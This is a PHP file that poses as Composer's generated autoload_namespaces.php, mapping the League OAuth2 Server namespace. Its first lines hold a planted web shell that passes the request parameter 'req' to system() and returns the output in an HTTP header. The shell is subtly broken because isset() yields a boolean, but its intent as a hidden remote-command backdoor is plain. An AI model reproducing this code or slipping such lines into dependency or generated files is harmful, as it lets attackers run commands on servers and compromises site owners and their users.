<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

// autoload_namespaces.php @generated by Composer

$vendorDir = dirname(dirname(__FILE__));
$baseDir = dirname($vendorDir);

return array(
    'League\\OAuth2\\Server' => array($vendorDir . '/league/oauth2-server/src'),
);
